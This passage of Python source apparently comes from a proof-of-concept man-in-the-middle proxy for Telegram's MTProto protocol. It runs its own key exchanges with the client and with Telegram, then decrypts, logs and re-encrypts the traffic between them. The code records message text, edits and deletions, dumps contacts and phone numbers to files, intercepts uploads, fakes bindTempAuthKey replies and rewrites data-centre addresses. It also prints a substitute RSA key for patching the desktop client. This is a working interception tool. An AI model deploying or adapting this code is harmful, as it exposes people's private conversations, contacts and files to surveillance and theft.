                if ff & 8: _, off = tl_read_str(body, off)   # post_author
                if ff & 16: _, off = _decode_peer(body, off)  # saved_from_peer
                if ff & 16: off += 4  # saved_from_msg_id
                if ff & 32: _, off = _decode_peer(body, off)  # saved_from_id
                if ff & 32: _, off = tl_read_str(body, off)   # saved_from_name
                if ff & 32: off += 4  # saved_date
                if ff & 64: _, off = tl_read_str(body, off)   # psa_type
        if flags & 0x800:  # flags.11 → via_bot_id:long
            off += 8
        if flags & 8:  # flags.3 → reply_to:MessageReplyHeader
            rc = struct.unpack_from('<I', body, off)[0]; off += 4
            rnm = TL_NAMES.get(rc, '')
            if rnm == 'messageReplyHeader':
                rf, off = tl_read_i32(body, off)
                if rf & 16: _, off = _decode_peer(body, off)  # reply_from
                if rf & 1: off += 4  # reply_to_msg_id
                if rf & 2: _, off = _decode_peer(body, off)   # reply_to_peer_id
                if rf & 4: off += 4  # reply_to_top_id
            # other reply header types - just give up on the message text
        off += 4  # date:int
        msg, _ = tl_read_str(body, off)
        direction = '←' if not is_out else '→'
        src = f" from {from_id}" if from_id else ""
        return f"{direction}{peer_id}{src}: {msg!r}" if msg else None
    except Exception:
        return None


def _decode_update_short_msg(body: bytes) -> str | None:
    try:
        off = 4
        flags, off = tl_read_i32(body, off)
        is_out = bool(flags & 2)
        msg_id, off = tl_read_i32(body, off)  # id
        user_id, off = tl_read_i64(body, off)  # user_id
        msg, off = tl_read_str(body, off)  # message
        direction = '←' if not is_out else '→'
        return f"{direction}user({user_id}): {msg!r}" if msg else None
    except Exception:
        return None


def _decode_update_short_chat_msg(body: bytes) -> str | None:
    try:
        off = 4
        flags, off = tl_read_i32(body, off)
        is_out = bool(flags & 2)
        msg_id, off = tl_read_i32(body, off)  # id
        from_id, off = tl_read_i64(body, off)  # from_id
        chat_id, off = tl_read_i64(body, off)  # chat_id
        msg, off = tl_read_str(body, off)  # message
        direction = '←' if not is_out else '→'
        return f"{direction}chat({chat_id}) from user({from_id}): {msg!r}" if msg else None
    except Exception:
        return None


def _decode_update_vector(body: bytes, off: int, d: str, depth: int):
    if off + 4 > len(body): return
    vc = struct.unpack_from('<I', body, off)[0]; off += 4
    if vc == C_VECTOR: pass
    else: off -= 4  # not a vector ctor - treat as count directly? unlikely
    cnt, off = tl_read_i32(body, off)
    pad = "  " * (depth + 2)
    for _ in range(cnt or 0):
        if off + 4 > len(body): break
        uc = struct.unpack_from('<I', body, off)[0]
        unm = TL_NAMES.get(uc, '')
        if unm in ('updateNewMessage', 'updateNewChannelMessage', 'updateEditMessage', 'updateEditChannelMessage'):
            off += 4  # skip update ctor
            # next is message:Message ctor
            if off + 4 > len(body): break
            mc = struct.unpack_from('<I', body, off)[0]
            mnm = TL_NAMES.get(mc, '')
            if mnm == 'message':
                # need to figure out message length - scan to get readable text
                s = _decode_incoming_msg(body[off:])
                if s:
                    action = 'EDIT' if 'Edit' in unm else 'MSG'
                    log.info(f"DECODED {action} {s}")
            # skip update
            break
        elif unm == 'updateDeleteMessages':
            off += 4
            off += 4  # vector ctor
            cnt2, off = tl_read_i32(body, off)
            ids = []
            for _ in range(cnt2 or 0):
                mid, off = tl_read_i32(body, off)
                ids.append(mid)
            off += 8  # pts + pts_count
            log.info(f"DECODED DELETE msgs {ids}")
        else:
            break


def _decode_users_vector(body: bytes, off: int) -> list[str]:
    users = []
    if off + 4 > len(body): return users
    vc = struct.unpack_from('<I', body, off)[0]; off += 4
    if vc != C_VECTOR: return users
    cnt, off = tl_read_i32(body, off)
    for _ in range(cnt or 0):
        if off + 4 > len(body): break
        uc = struct.unpack_from('<I', body, off)[0]; off += 4
        unm = TL_NAMES.get(uc, '')
        if unm == 'user':
            try:
                uf, off = tl_read_i32(body, off)  # flags
                uf2, off = tl_read_i32(body, off)  # flags2
                uid, off = tl_read_i64(body, off)  # id
                if uf & 1: _, off = tl_read_i64(body, off)  # access_hash
                first = last = username = phone = None
                if uf & 2: first, off = tl_read_str(body, off)
                if uf & 4: last, off = tl_read_str(body, off)
                if uf & 8: username, off = tl_read_str(body, off)
                if uf & 16: phone, off = tl_read_str(body, off)
                if uf & 32: off += 4; off += 4  # photo: UserProfilePhoto ctor + skip
                if uf & 64: off += 4  # status: UserStatus ctor
                name = f"{first or ''} {last or ''}".strip()
                parts = [f"id={uid}"]
                if name: parts.append(f"name={name!r}")
                if username: parts.append(f"@{username}")
                if phone: parts.append(f"phone={phone}")
                users.append(", ".join(parts))
            except Exception:
                break  # couldn't parse remaining fields, stop
        elif unm == 'userEmpty':
            _, off = tl_read_i64(body, off)
        else:
            break
    return users


def _decode_contacts(body: bytes) -> str | None:
    try:
        off = 4  # skip ctor
        # contacts:Vector<Contact>
        off += 4  # vector ctor
        cnt, off = tl_read_i32(body, off)
        contacts = []
        for _ in range(cnt or 0):
            off += 4  # contact# ctor
            uid, off = tl_read_i64(body, off)  # user_id
            off += 4  # mutual:Bool ctor
            contacts.append(uid)
        saved_cnt, off = tl_read_i32(body, off)  # saved_count
        # users:Vector<User>
        users = _decode_users_vector(body, off)
        contacts_file = MEDIA_DIR / f"contacts_{time.strftime('%Y%m%d_%H%M%S')}.json"
        MEDIA_DIR.mkdir(exist_ok=True)
        contacts_file.write_text(json.dumps({
            "contact_ids": contacts, "saved_count": saved_cnt,
            "users": users, "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
        }, indent=2, ensure_ascii=False))
        log.warning(f"!!! CONTACTS DUMPED: {len(contacts)} contacts, {len(users)} users → {contacts_file.name}")
        return f"{len(contacts)} contacts"
    except Exception:
        return None


def _log_tl(body: bytes, d: str, depth: int):
    if len(body) < 4: return
    c = struct.unpack_from('<I', body, 0)[0]
    nm = TL_NAMES.get(c, f"0x{c:08X}")
    pad = "  " * (depth + 1)

    match nm:
        case "msg_container":
            cnt = struct.unpack_from('<I', body, 4)[0]; o = 8
            log.debug(f"{pad}[{d}] msg_container ({cnt})")
            for _ in range(cnt):
                if o+16 > len(body): break
                il = struct.unpack_from('<I', body, o+12)[0]
                _log_tl(body[o+16:o+16+il], d, depth+1); o += 16+il
        case "rpc_result":
            rid = struct.unpack_from('<q', body, 4)[0]
            log.debug(f"{pad}[{d}] rpc_result (req={rid})")
            if len(body) > 12: _log_tl(body[12:], d, depth+1)
        case "rpc_error":
            if len(body) >= 8:
                ec = struct.unpack_from('<i', body, 4)[0]
                em, _ = tl_read_str(body, 8)
                log.info(f"{pad}[{d}] rpc_error {ec}: {em}")
            else:
                log.info(f"{pad}[{d}] rpc_error")
        case "gzip_packed":
            try:
                gz, _ = tl_read(body, 4); uc = gzip.decompress(gz)
                log.debug(f"{pad}[{d}] gzip_packed ({len(gz)}→{len(uc)})")
                _log_tl(uc, d, depth+1)
            except Exception:
                log.debug(f"{pad}[{d}] gzip_packed (failed)")
        case "messages.sendMessage":
            s = _decode_send(body)
            log.info(f"DECODED messages.sendMessage {s or '(?)'}") if s else log.info(f"{pad}[{d}] messages.sendMessage")
        case "messages.editMessage":
            s = _decode_send(body, edited=True)
            log.info(f"DECODED messages.editMessage {s or '(?)'}") if s else log.info(f"{pad}[{d}] messages.editMessage")
        case "messages.sendMedia":
            s = _decode_send_media(body)
            log.info(f"DECODED messages.sendMedia {s or '(?)'}") if s else log.info(f"{pad}[{d}] messages.sendMedia")
        case "upload.saveFilePart" | "upload.saveBigFilePart":
            _intercept_upload(body)
            log.debug(f"{pad}[{d}] {nm} ({len(body)}B)")
        case "updateShortMessage":
            s = _decode_update_short_msg(body)
            if s: log.info(f"DECODED updateShortMessage MSG {s}")
            else: log.debug(f"{pad}[{d}] updateShortMessage")
        case "updateShortChatMessage":
            s = _decode_update_short_chat_msg(body)
            if s: log.info(f"DECODED updateShortChatMessage MSG {s}")
            else: log.debug(f"{pad}[{d}] updateShortChatMessage")
        case "updates" | "updatesCombined":
            log.debug(f"DECODED updates {nm}")
            _decode_update_vector(body, 4, d, depth)
        case "updateShort":
            if len(body) >= 8:
                _log_tl(body[4:], d, depth+1)  # update:Update + date
        case "updateNewMessage" | "updateNewChannelMessage" | "updateEditMessage" | "updateEditChannelMessage":
            if len(body) >= 8:
                mc = struct.unpack_from('<I', body, 4)[0]
                if TL_NAMES.get(mc) == 'message':
                    s = _decode_incoming_msg(body[4:])
                    action = 'EDIT' if 'Edit' in nm else 'MSG'
                    if s: log.info(f"DECODED {action} {s}")
                    else: log.debug(f"{pad}[{d}] {nm}")
                else:
                    log.debug(f"{pad}[{d}] {nm} ({TL_NAMES.get(mc, '?')})")
        case "contacts.contacts":
            _decode_contacts(body)
            log.debug(f"{pad}[{d}] contacts.contacts")
        case _:
            log.debug(f"{pad}[{d}] {nm} ({len(body)}B)")


def _log_decrypted(pt: bytes, d: str):
    if len(pt) < 32: return
    ml = struct.unpack_from('<I', pt, 28)[0]
    _log_tl(pt[32:32+ml], d, 0)

# IP rewriting

_IP_RE = re.compile(rb'^(149\.154\.|91\.108\.|95\.161\.|2001:067c:|2001:b28:f23)')

def _rewrite_ips(data: bytes) -> bytes:
    NEW = b'127.0.0.1'; NL = len(NEW)
    out = bytearray(); i = 0
    while i < len(data):
        n = data[i]
        if 7 <= n <= 25 and i+1+n <= len(data) and _IP_RE.match(data[i+1:i+1+n]):
            op = (-(1+n)) % 4; np = (-(1+NL)) % 4
            out.append(NL); out.extend(NEW); out.extend(b'\x00'*np)
            i += 1+n+op; continue
        out.append(data[i]); i += 1
    return bytes(out)


def _patch_body(body: bytes) -> bytes:
    if len(body) < 4: return body
    c = struct.unpack_from('<I', body, 0)[0]
    if c == C_MSG_CONTAINER:
        cnt = struct.unpack_from('<I', body, 4)[0]; o = 8
        items = bytearray(struct.pack('<II', c, cnt)); ch = False
        for _ in range(cnt):
            if o+16 > len(body): items.extend(body[o:]); break
            mid = struct.unpack_from('<q', body, o)[0]
            sq = struct.unpack_from('<I', body, o+8)[0]
            il = struct.unpack_from('<I', body, o+12)[0]
            ib = body[o+16:o+16+il]; nb = _patch_body(ib)
            if nb is not ib: ch = True
            items.extend(struct.pack('<qII', mid, sq, len(nb))); items.extend(nb)
            o += 16 + il
        return bytes(items) if ch else body
    if c == C_RPC_RESULT:
        inner = _patch_body(body[12:])
        return body[:12] + inner if inner is not body[12:] else body
    if c == 0x3072CFA1:
        try:
            gz, end = tl_read(body, 4)
            uc = gzip.decompress(gz); pw = _rewrite_ips(uc)
            if pw == uc: return body
            nc = gzip.compress(pw)
            if len(nc) < 254: enc = bytes([len(nc)]) + nc
            else: enc = b'\xfe' + len(nc).to_bytes(3, 'little') + nc
            return struct.pack('<I', c) + enc + b'\x00' * ((-len(enc)) % 4) + body[4 + (end - 4):]  # rest after gzip TL blob
        except Exception:
            return body
    return body


def _update_salt(body: bytes, sa: AuthState):
    if len(body) < 4: return
    c = struct.unpack_from('<I', body, 0)[0]
    if c == C_MSG_CONTAINER:
        cnt = struct.unpack_from('<I', body, 4)[0]; o = 8
        for _ in range(cnt):
            if o+16 > len(body): break
            il = struct.unpack_from('<I', body, o+12)[0]
            _update_salt(body[o+16:o+16+il], sa); o += 16+il
        return
    if c == 0x9EC20908 and len(body) >= 28:
        ns = body[20:28]
        if ns != sa.server_salt: log.debug(f"Salt updated (new_session_created)"); sa.server_salt = ns
    elif c == 0xEDAB447B and len(body) >= 28:
        ns = body[20:28]
        if ns != sa.server_salt: log.debug(f"Salt updated (bad_server_salt)"); sa.server_salt = ns

# Auth exchange, proxy as server (client side)

async def _auth_with_client(r, w, obfs, priv_key, dc_id, framing, first_msg=None) -> Optional[AuthState]:
    F = get_framing(framing); st = AuthState(dc_id=dc_id)
    pub = priv_key.public_key(); fp = compute_fingerprint(pub)

    for attempt in range(5):
        msg = first_msg if attempt == 0 and first_msg else (msg if attempt > 0 else await F.read(r, obfs))
        if len(msg) < 20: return None
        kid = msg[:8]
        if kid != b'\x00'*8:
            if kid in _auth_key_cache:
                log.info(f"Client resuming session (key={kid.hex()[:16]}…)")
                st.auth_key = _auth_key_cache[kid]; st.auth_key_id = kid
                pt = decrypt_msg(msg, st.auth_key, True)
                st.server_salt = pt[:8] if pt else b'\x00'*8
                st.queued_client_msg = msg; return st
            F.write(w, struct.pack('<i', -404), obfs); await w.drain(); return None

        body = msg[20:20+struct.unpack_from('<I', msg, 16)[0]]
        c = struct.unpack_from('<I', body, 0)[0]
        if c not in (C_REQ_PQ_MULTI, C_REQ_PQ): return None
        st.nonce = body[4:20]; st.server_nonce = os.urandom(16)
        while True:
            st.p = _random_prime(32); st.q = _random_prime(32)
            if st.p != st.q: break
        if st.p > st.q: st.p, st.q = st.q, st.p
        st.pq = st.p * st.q
        pqb = st.pq.to_bytes((st.pq.bit_length()+7)//8, 'big')
        rp = struct.pack('<I', C_RES_PQ) + st.nonce + st.server_nonce + tl_bytes(pqb)
        rp += struct.pack('<II', C_VECTOR, 1) + struct.pack('<Q', fp)
        _send_unenc(w, obfs, rp, F); await w.drain()
        log.debug(f"Sent resPQ #{attempt+1}")

        try: msg = await asyncio.wait_for(F.read(r, obfs), timeout=30)
        except (asyncio.IncompleteReadError, asyncio.TimeoutError): return None

        s2kid = msg[:8]
        if s2kid != b'\x00'*8:
            if s2kid in _auth_key_cache:
                log.info(f"Client resuming session (key={s2kid.hex()[:16]}…)")
                st.auth_key = _auth_key_cache[s2kid]; st.auth_key_id = s2kid
                pt = decrypt_msg(msg, st.auth_key, True)
                st.server_salt = pt[:8] if pt else b'\x00'*8
                st.queued_client_msg = msg; return st
            return None
        if len(msg) < 20: return None
        body = msg[20:20+struct.unpack_from('<I', msg, 16)[0]]
        c = struct.unpack_from('<I', body, 0)[0]
        if c == C_REQ_DH_PARAMS: break
        if c in (C_REQ_PQ_MULTI, C_REQ_PQ): continue
        return None
    else:
        return None

    # req_DH_params
    off = 4; off += 32  # nonce + server_nonce
    _, off = tl_read(body, off); _, off = tl_read(body, off)  # p, q
    fp_got = struct.unpack_from('<Q', body, off)[0]; off += 8
    enc_data, _ = tl_read(body, off)
    if fp_got != fp: return None

    inner_pad = decrypt_pq_inner_rsa(enc_data, priv_key)
    if not inner_pad: return None
    ic = struct.unpack_from('<I', inner_pad, 0)[0]; io = 4
    _, io = tl_read(inner_pad, io); _, io = tl_read(inner_pad, io); _, io = tl_read(inner_pad, io)
    io += 32  # nonce + server_nonce
    st.new_nonce = inner_pad[io:io+32]; io += 32
    if ic in (C_PQ_INNER_DC, C_PQ_INNER_TEMP_DC): io += 4

    tk, tiv = _derive_tmp_aes(st.new_nonce, st.server_nonce)
    st.our_a = int.from_bytes(os.urandom(256), 'big') % (DH_PRIME-2) + 2
    st.g_a = pow(DH_G, st.our_a, DH_PRIME)

    di = struct.pack('<I', C_SERVER_DH_INNER) + st.nonce + st.server_nonce + struct.pack('<i', DH_G)
    di += tl_bytes(DH_PRIME.to_bytes(256, 'big')) + tl_bytes(st.g_a.to_bytes(256, 'big'))
    di += struct.pack('<i', int(time.time()))
    te = hashlib.sha1(di).digest() + di
    te += os.urandom((16 - len(te)%16) % 16 or 0)
    ea = aes_ige_encrypt(te, tk, tiv)
    resp = struct.pack('<I', C_DH_PARAMS_OK) + st.nonce + st.server_nonce + tl_bytes(ea)
    _send_unenc(w, obfs, resp, F); await w.drain()

    # set_client_DH_params
    try: msg = await F.read(r, obfs)
    except asyncio.IncompleteReadError: return None
    body = msg[20:20+struct.unpack_from('<I', msg, 16)[0]]
    if struct.unpack_from('<I', body, 0)[0] != C_SET_CLIENT_DH: return None
    ecd, _ = tl_read(body, 36)
    cir = aes_ige_decrypt(ecd, tk, tiv)
    if struct.unpack_from('<I', cir, 20)[0] != C_CLIENT_DH_INNER: return None
    gb_bytes, _ = tl_read(cir, 64)  # SHA1(20)+ctor(4)+nonce(16)+server_nonce(16)+retry_id(8)=64
    st.g_b = int.from_bytes(gb_bytes, 'big')
    aki = pow(st.g_b, st.our_a, DH_PRIME)
    st.auth_key = aki.to_bytes(256, 'big')
    aks = hashlib.sha1(st.auth_key).digest()
    st.auth_key_id = aks[12:20]
    st.server_salt = bytes(a ^ b for a, b in zip(st.new_nonce[:8], st.server_nonce[:8]))
    nnh = hashlib.sha1(st.new_nonce + b'\x01' + aks[:8]).digest()[4:20]
    dg = struct.pack('<I', C_DH_GEN_OK) + st.nonce + st.server_nonce + nnh
    _send_unenc(w, obfs, dg, F); await w.drain()
    _auth_key_cache[st.auth_key_id] = st.auth_key; _save_cache()
    log.info(f"Client auth complete (key={st.auth_key_id.hex()[:16]}…)")
    return st

# Auth exchange, proxy as client (real TG side)

async def _auth_with_tg(r, w, obfs, dc_id) -> Optional[AuthState]:
    st = AuthState(dc_id=dc_id)
    pem = REAL_TG_RSA_PEM.decode().strip().split('\n')
    der = base64.b64decode(''.join(pem[1:-1]))
    tg_pub = load_pkcs1_pub(der); tg_fp = compute_fingerprint(tg_pub)

    st.nonce = os.urandom(16)
    _send_unenc(w, obfs, struct.pack('<I', C_REQ_PQ_MULTI) + st.nonce, server=False)
    await w.drain()

    msg = await IntermediateFraming.read(r, obfs)
    body = msg[20:20+struct.unpack_from('<I', msg, 16)[0]]
    if struct.unpack_from('<I', body, 0)[0] != C_RES_PQ: return None
    off = 4; off += 16; st.server_nonce = body[off:off+16]; off += 16
    pqb, off = tl_read(body, off)
    vec_h = struct.unpack_from('<I', body, off)[0]
    if vec_h == C_VECTOR: off += 4
    cnt = struct.unpack_from('<I', body, off)[0]; off += 4
    fps = [struct.unpack_from('<Q', body, off+i*8)[0] for i in range(cnt)]
    st.pq = int.from_bytes(pqb, 'big'); st.p, st.q = factorize_pq(st.pq)
    st.new_nonce = os.urandom(32)
    if tg_fp not in fps: return None

    inner = struct.pack('<I', C_PQ_INNER_DC) + tl_bytes(pqb)
    inner += tl_bytes(st.p.to_bytes((st.p.bit_length()+7)//8, 'big'))
    inner += tl_bytes(st.q.to_bytes((st.q.bit_length()+7)//8, 'big'))
    inner += st.nonce + st.server_nonce + st.new_nonce + struct.pack('<i', dc_id)
    rdh = struct.pack('<I', C_REQ_DH_PARAMS) + st.nonce + st.server_nonce
    rdh += tl_bytes(st.p.to_bytes((st.p.bit_length()+7)//8, 'big'))
    rdh += tl_bytes(st.q.to_bytes((st.q.bit_length()+7)//8, 'big'))
    rdh += struct.pack('<Q', tg_fp) + tl_bytes(encrypt_pq_inner_rsa(inner, tg_pub))
    _send_unenc(w, obfs, rdh, server=False); await w.drain()

    msg = await IntermediateFraming.read(r, obfs)
    body = msg[20:20+struct.unpack_from('<I', msg, 16)[0]]
    c = struct.unpack_from('<I', body, 0)[0]
    if c != C_DH_PARAMS_OK: return None
    enc_a, _ = tl_read(body, 36)
    tk, tiv = _derive_tmp_aes(st.new_nonce, st.server_nonce)
    ar = aes_ige_decrypt(enc_a, tk, tiv)
    if struct.unpack_from('<I', ar, 20)[0] != C_SERVER_DH_INNER: return None
    do = 24 + 32 + 4  # hash+ctor+nonces+g
    dpb, do = tl_read(ar, do); gab, do = tl_read(ar, do)
    dp = int.from_bytes(dpb, 'big'); st.g_a = int.from_bytes(gab, 'big')
    b = int.from_bytes(os.urandom(256), 'big') % (dp-2) + 2
    st.g_b = pow(DH_G, b, dp)
    aki = pow(st.g_a, b, dp); st.auth_key = aki.to_bytes(256, 'big')
    aks = hashlib.sha1(st.auth_key).digest()
    st.auth_key_id = aks[12:20]
    st.server_salt = bytes(a ^ bb for a, bb in zip(st.new_nonce[:8], st.server_nonce[:8]))

    cdi = struct.pack('<I', C_CLIENT_DH_INNER) + st.nonce + st.server_nonce
    cdi += struct.pack('<Q', 0) + tl_bytes(st.g_b.to_bytes(256, 'big'))
    te = hashlib.sha1(cdi).digest() + cdi
    te += os.urandom((16 - len(te)%16) % 16 or 0)
    sdh = struct.pack('<I', C_SET_CLIENT_DH) + st.nonce + st.server_nonce + tl_bytes(aes_ige_encrypt(te, tk, tiv))
    _send_unenc(w, obfs, sdh, server=False); await w.drain()

    msg = await IntermediateFraming.read(r, obfs)
    body = msg[20:20+struct.unpack_from('<I', msg, 16)[0]]
    if struct.unpack_from('<I', body, 0)[0] != C_DH_GEN_OK: return None
    log.info(f"TG DC{dc_id} auth complete (key={st.auth_key_id.hex()[:16]}…)")
    return st

# bindTempAuthKey intercept

def _intercept_bind(pt: bytes):
    if len(pt) < 32: return [], None
    salt, sid = pt[:8], pt[8:16]
    mid = struct.unpack_from('<q', pt, 16)[0]
    sq = struct.unpack_from('<I', pt, 24)[0]
    ml = struct.unpack_from('<I', pt, 28)[0]
    body = pt[32:32+ml]
    if len(body) < 4: return [], None
    c = struct.unpack_from('<I', body, 0)[0]
    if c == C_BIND_TEMP_KEY: return [mid], None
    if c != C_MSG_CONTAINER: return [], None
    cnt = struct.unpack_from('<I', body, 4)[0]; o = 8
    binds, keep = [], []
    for _ in range(cnt):
        if o+16 > len(body): break
        im = struct.unpack_from('<q', body, o)[0]
        isq = struct.unpack_from('<I', body, o+8)[0]
        il = struct.unpack_from('<I', body, o+12)[0]
        ib = body[o+16:o+16+il]; o += 16+il
        if len(ib) >= 4 and struct.unpack_from('<I', ib, 0)[0] == C_BIND_TEMP_KEY:
            binds.append(im)
        else:
            keep.append((im, isq, ib))
    if not binds: return [], None
    if not keep: return binds, None
    nc = struct.pack('<II', C_MSG_CONTAINER, len(keep))
    for im, isq, ib in keep: nc += struct.pack('<qII', im, isq, len(ib)) + ib
    np = salt + sid + struct.pack('<qII', mid, sq, len(nc)) + nc
    np += os.urandom(12 + (-(len(np)+12) % 16)); return binds, np


def _build_true(auth, sid, rmid) -> bytes:
    body = struct.pack('<IqI', C_RPC_RESULT, rmid, C_BOOL_TRUE)
    inner = auth.server_salt + sid + struct.pack('<qII', _gen_msg_id(), 1, len(body)) + body
    inner += os.urandom(12 + (-(len(inner)+12) % 16))
    return encrypt_msg(inner, auth.auth_key, from_client=False)

# Message bridge

async def bridge(cr, cw, co, ca, sr, sw, so, sa, cf, pk, dc):
    CF, SF = get_framing(cf), IntermediateFraming
    log.info(f"Bridge active DC{dc} [client={ca.auth_key_id.hex()[:12]} server={sa.auth_key_id.hex()[:12]}]")

    async def c2s():
        try:
            pm = ca.queued_client_msg; ca.queued_client_msg = None
            log.debug(f"c2s started, queued={pm is not None}")
            while True:
                if pm: msg = pm; pm = None
                else: msg = await CF.read(cr, co)
                log.debug(f"c2s got {len(msg)}B, kid={msg[:8].hex()}")
                kid = msg[:8]
                if kid == b'\x00'*8:
                    if len(msg) >= 24:
                        b = msg[20:20+struct.unpack_from('<I', msg, 16)[0]]
                        c = struct.unpack_from('<I', b, 0)[0] if len(b) >= 4 else 0
                        if c in (C_REQ_PQ_MULTI, C_REQ_PQ) and pk:
                            ta = await _auth_with_client(cr, cw, co, pk, dc, cf, first_msg=msg)
                            if ta:
                                ca.auth_key = ta.auth_key; ca.auth_key_id = ta.auth_key_id
                                ca.server_salt = ta.server_salt
                                _auth_key_cache[ta.auth_key_id] = ta.auth_key; _save_cache()
                            continue
                    SF.write(sw, msg, so); await sw.drain(); continue

                pt = decrypt_msg(msg, ca.auth_key, True)
                if not pt:
                    SF.write(sw, msg, so); await sw.drain(); continue

                _log_decrypted(pt, "CLIENT→SERVER")

                bids, spt = _intercept_bind(pt)
                if bids:
                    sid = pt[8:16]
                    for m in bids:
                        log.debug(f"bindTempAuthKey intercepted, faking True")
                        CF.write(cw, _build_true(ca, sid, m), co)
                    await cw.drain()
                    if not spt: continue
                    pt = spt

                rp = sa.server_salt + pt[8:]
                if len(rp) % 16:
                    pn = 16 - len(rp) % 16
                    while pn < 12: pn += 16
                    rp += os.urandom(pn)
                re = encrypt_msg(rp, sa.auth_key, True)
                log.debug(f"c2s forwarding {len(re)}B to server")
                SF.write(sw, re, so); await sw.drain()
        except asyncio.IncompleteReadError as e:
            log.debug(f"c2s closed: IncompleteReadError partial={len(e.partial)}B")
        except ConnectionError as e:
            log.debug(f"c2s closed: {e}")
        except Exception as e: log.exception(f"C→S error: {e}")
        finally: sw.close()

    async def s2c():
        try:
            log.debug("s2c started")
            while True:
                msg = await SF.read(sr, so)
                log.debug(f"s2c got {len(msg)}B, kid={msg[:8].hex()}")
                if msg[:8] == b'\x00'*8:
                    CF.write(cw, msg, co); await cw.drain(); continue

                pt = decrypt_msg(msg, sa.auth_key, False)
                if not pt:
                    CF.write(cw, msg, co); await cw.drain(); continue

                _log_decrypted(pt, "SERVER→CLIENT")

                try:
                    ml = struct.unpack_from('<I', pt, 28)[0]
                    _update_salt(pt[32:32+ml], sa)
                except Exception: pass

                ml = struct.unpack_from('<I', pt, 28)[0]
                rb = pt[32:32+ml]; pb = _patch_body(rb)
                if pb is not rb:
                    log.debug("Rewrote DC IPs")
                    ni = pt[:28] + struct.pack('<I', len(pb)) + pb
                    pt = ni + os.urandom(12 + (-(len(ni)+12) % 16))

                rp = ca.server_salt + pt[8:]
                if len(rp) % 16:
                    pn = 16 - len(rp) % 16
                    while pn < 12: pn += 16
                    rp += os.urandom(pn)
                re = encrypt_msg(rp, ca.auth_key, False)
                log.debug(f"s2c forwarding {len(re)}B to client")
                CF.write(cw, re, co); await cw.drain()
        except asyncio.IncompleteReadError as e:
            log.debug(f"s2c closed: IncompleteReadError partial={len(e.partial)}B")
        except ConnectionError as e:
            log.debug(f"s2c closed: {e}")
        except Exception as e: log.exception(f"S→C error: {e}")
        finally: cw.close()

    await asyncio.gather(c2s(), s2c())


async def _connect_tg(dc_id: int):
    ip = REAL_DC_IPS.get(dc_id, REAL_DC_IPS[2])
    r, w = await asyncio.wait_for(asyncio.open_connection(ip, 443), timeout=15)
    init = gen_obfs2_init(dc_id); w.write(init); await w.drain()
    obfs = Obfuscated2(init, is_client=False)
    if dc_id in _server_auth_cache:
        c = _server_auth_cache[dc_id]
        log.info(f"Reusing TG DC{dc_id} auth (key={c.auth_key_id.hex()[:16]}…)")
        return r, w, obfs, c
    sa = await asyncio.wait_for(_auth_with_tg(r, w, obfs, dc_id), timeout=60)
    _server_auth_cache[dc_id] = sa; _save_cache()
    return r, w, obfs, sa


def _parse_init(data: bytes):
    ks = Cipher(algorithms.AES(data[8:40]), modes.CTR(data[40:56])).encryptor().update(b'\x00'*64)
    plain = (int.from_bytes(data[56:64], 'big') ^ int.from_bytes(ks[56:64], 'big')).to_bytes(8, 'big')
    proto, dc = struct.unpack('<Ih', plain[:6])
    return abs(dc) if abs(dc) in range(1, 6) else 2, proto


async def handle(cr, cw, pk):
    peer = cw.get_extra_info('peername')
    try:
        init = await asyncio.wait_for(cr.readexactly(64), timeout=30)
        dc_id, proto = _parse_init(init)
        framing = "abridged" if proto == 0xEFEFEFEF else "intermediate"
        co = Obfuscated2(init, is_client=True)
        log.info(f"Connection from {peer} → DC{dc_id} ({framing})")

        stask = asyncio.create_task(_connect_tg(dc_id))
        ca = await asyncio.wait_for(_auth_with_client(cr, cw, co, pk, dc_id, framing), timeout=60)
        if not ca: stask.cancel(); return

        sr, sw, so, sa = await asyncio.wait_for(stask, timeout=30)
        if not sa: return

        log.info(f"MITM active DC{dc_id}: client={ca.auth_key_id.hex()[:16]} server={sa.auth_key_id.hex()[:16]}")
        await bridge(cr, cw, co, ca, sr, sw, so, sa, framing, pk, dc_id)
    except asyncio.TimeoutError:
        log.warning(f"Timeout from {peer}")
    except Exception as e:
        log.exception(f"Error: {e}")
    finally:
        cw.close()

# Key generation

def generate_keys():
    KEY_DIR.mkdir(exist_ok=True)
    pk = rsa.generate_private_key(65537, 2048, default_backend())
    pub = pk.public_key()
    (KEY_DIR / "private.pem").write_bytes(pk.private_bytes(Encoding.PEM, PrivateFormat.TraditionalOpenSSL, NoEncryption()))

    pkcs8 = pub.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
    # Extract PKCS#1 from PKCS#8
    o = 1
    f = pkcs8[o]; o += 1
    if f >= 0x80: o += f & 0x7F
    assert pkcs8[o] == 0x30; o += 1
    f = pkcs8[o]; o += 1
    al = f if f < 0x80 else int.from_bytes(pkcs8[o:o+(f&0x7F)], 'big')
    if f >= 0x80: o += f & 0x7F
    o += al
    assert pkcs8[o] == 0x03; o += 1
    f = pkcs8[o]; o += 1
    if f >= 0x80: nb = f & 0x7F; o += nb
    o += 1  # unused bits
    pkcs1 = pkcs8[o:]

    b64 = base64.b64encode(pkcs1).decode()
    lines = [b64[i:i+64] for i in range(0, len(b64), 64)]
    pem = "-----BEGIN RSA PUBLIC KEY-----\n" + "\n".join(lines) + "\n-----END RSA PUBLIC KEY-----"
    (KEY_DIR / "public_pkcs1.pem").write_text(pem)
    (KEY_DIR / "public_pkcs8.pem").write_bytes(pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo))

    fp = compute_fingerprint(pub)
    print(f"Keys → {KEY_DIR}/")
    print(f"  Fingerprint: 0x{fp:016X}")
    print(f"\n=== For tdesktop kPublicRSAKeys[] ===\n")
    clines = [l + "\\n\\" for l in pem.split('\n')]
    print('const char *kPublicRSAKeys[] = { "\\')
    for cl in clines: print(cl)
    print('" };')


async def run_server(pk):
    _load_cache()
    fp = compute_fingerprint(pk.public_key())
    log.info(f"RSA fingerprint: 0x{fp:016X}")
    srv = await asyncio.start_server(lambda r, w: handle(r, w, pk), LISTEN_HOST, LISTEN_PORT)
    addrs = ', '.join(str(s.getsockname()) for s in srv.sockets)
    log.info(f"Listening on {addrs}")
    async with srv: await srv.serve_forever()


def main():
    global LISTEN_HOST, LISTEN_PORT
    p = argparse.ArgumentParser(description="MTProto MITM PoC")
    sub = p.add_subparsers(dest="cmd")
    sub.add_parser("generate-keys")
    rp = sub.add_parser("run")
    rp.add_argument("--host", default=LISTEN_HOST)
    rp.add_argument("--port", type=int, default=LISTEN_PORT)
    rp.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    if args.cmd == "generate-keys":
        generate_keys(); return
